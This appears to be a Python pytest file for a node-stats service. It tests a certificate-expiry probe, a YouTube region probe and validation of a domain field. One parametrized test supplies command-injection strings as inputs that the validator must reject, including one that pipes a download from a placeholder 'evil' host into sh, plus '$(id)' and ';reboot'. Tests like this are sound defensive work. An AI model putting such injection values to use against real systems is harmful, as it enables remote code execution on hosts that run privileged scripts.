"""Ф7 — cert-expiry probe on the node-stats endpoint (degrades, never raises)."""
import asyncio

import pytest
from pydantic import ValidationError

from app.api.stats import _cert_expiry, _yt_geo_status, CertInfo, NodeStatsRequest


class _SSH:
    """Fake SSHSession returning a canned `get_output` result."""
    def __init__(self, out: str):
        self._out = out

    async def get_output(self, _script: str) -> str:
        return self._out


def _probe(out: str, domain: str = "n.example.com"):
    return asyncio.run(_cert_expiry(_SSH(out), domain))


def test_parses_delta_seconds_to_floored_days_and_notafter():
    # 43 days + 5h of seconds → floors to 43
    r = _probe(f"{43 * 86400 + 5 * 3600}|Jul 15 12:00:00 2026 GMT")
    assert isinstance(r, CertInfo)
    assert r.daysLeft == 43
    assert r.notAfter == "Jul 15 12:00:00 2026 GMT"


def test_just_expired_floors_to_negative_not_zero():
    # expired 3 hours ago → floor(-10800/86400) == -1 (not 0 as bash trunc would give)
    r = _probe("-10800|Jan 01 00:00:00 2020 GMT")
    assert r.daysLeft == -1


def test_expired_cert_reports_negative_days():
    r = _probe(f"{-5 * 86400}|Jan 01 00:00:00 2020 GMT")
    assert r.daysLeft == -5


def test_empty_domain_skips_probe():
    # no domain → None without touching SSH
    assert asyncio.run(_cert_expiry(_SSH("irrelevant"), "")) is None
    assert asyncio.run(_cert_expiry(_SSH("irrelevant"), "   ")) is None


def test_missing_cert_returns_none():
    # script emits nothing when the cert file is absent
    assert _probe("") is None
    assert _probe("\n") is None


def test_malformed_output_degrades_to_none():
    assert _probe("garbage no pipe") is None
    assert _probe("notanumber|Jul 15 2026") is None  # delta not an int


# ── domain shell-safety: reaches a root SSH script in _cert_expiry ──

@pytest.mark.parametrize("bad", [
    'x";curl evil|sh;"', "x$(id)", "n.example.com`id`", "a b.com", "n.evil.com;reboot",
])
def test_domain_rejects_shell_metacharacters(bad):
    with pytest.raises(ValidationError):
        NodeStatsRequest(ip="1.2.3.4", ssh_password="pw", domain=bad)


def test_domain_empty_and_valid_accepted():
    NodeStatsRequest(ip="1.2.3.4", ssh_password="pw", domain="")           # haproxy: skip
    NodeStatsRequest(ip="1.2.3.4", ssh_password="pw", domain="node1.example.com")


# ── YouTube Region probe (`_yt_geo_status`) ──────────────────────────────────
# Проба должна возвращать СТРОКУ всегда (фронт по ней рисует бейдж: код
# региона / «Реклама» / «—»), и обязана уметь обходиться без curl на хосте.

class _CapturingSSH:
    """Fake SSHSession, который ещё и запоминает отправленный скрипт."""
    def __init__(self, out: str = ""):
        self._out = out
        self.script: str | None = None

    async def get_output(self, script: str) -> str:
        self.script = script
        return self._out


def _yt_probe(out: str) -> str:
    return asyncio.run(_yt_geo_status(_SSH(out)))


def test_yt_region_code_passthrough_and_trim():
    assert _yt_probe("NL\n") == "NL"
    assert _yt_probe("  DE  ") == "DE"


def test_yt_region_ads_from_cache():
    # `ads` пишет yt-ads-monitoring в /tmp/yt_geo_status — реклама показывается
    assert _yt_probe("ads\n") == "ads"


def test_yt_region_empty_output_is_unknown_not_none():
    # Раньше пустой вывод давал "" → бейдж скрывался; теперь — строка.
    assert _yt_probe("") == "unknown"


def test_yt_region_never_none_and_capped():
    assert isinstance(_yt_probe(""), str)
    assert len(_yt_probe("x" * 50)) == 10


def test_yt_probe_script_has_all_fallbacks():
    ssh = _CapturingSSH("NL")
    asyncio.run(_yt_geo_status(ssh))
    s = ssh.script or ""
    assert "/tmp/yt_geo_status" in s              # кэш yt-ads-monitoring
    assert "command -v curl" in s                 # 1) curl на хосте
    assert "command -v wget" in s                 # 2) wget (GNU/busybox)
    assert "command -v python3" in s              # 3) python3 urllib
    assert "docker exec" in s and "remnanode" in s  # 4) curl внутри контейнера ноды
    assert "GL" in s                              # разбор geo-локации YouTube
